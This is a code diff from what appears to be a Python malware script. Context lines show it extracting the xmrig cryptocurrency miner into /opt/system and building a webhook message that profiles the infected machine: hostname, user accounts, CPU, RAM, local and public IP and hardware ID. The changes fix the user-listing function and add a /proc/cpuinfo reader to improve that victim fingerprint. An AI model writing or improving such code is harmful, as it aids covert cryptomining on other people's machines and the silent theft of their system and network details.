@@ -76,9 +76,20 @@ if config["MINER"] == True:
         extract_files(["xmrig"], "/opt/system/")
 def allusers():
     if platform.system() == "Windows":
-        os.listdir("/Users")
+        return os.listdir("/Users")
     else:
-        os.listdir("/home")
+        return os.listdir("/home")
+def get_processor_name():
+    with open('/proc/cpuinfo', 'r') as f:
+        lines = f.readlines()
+
+    for line in lines:
+        if line.strip().startswith('model name'):
+            _, processor_name = line.split(':', 1)
+            return processor_name.strip()
+
+    return "Unknown"
+
 # webhook
 embedcont = f'''
 ---------------------
@@ -90,7 +101,7 @@ OS.name -------- >> {os.name}
 HostName ------- >> {hostname}
 pc name -------- >> {pcname}
 All users ------ >> {allusers()}
-Proccessor ----- >> {platform.processor()}
+Proccessor ----- >> {get_processor_name()}
 RAM ------------ >> {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
 local Ip Address >> {localIPAddr}
 Ip Address ----- >> {IPAddr.text}HWID ---------- >> {hwid}
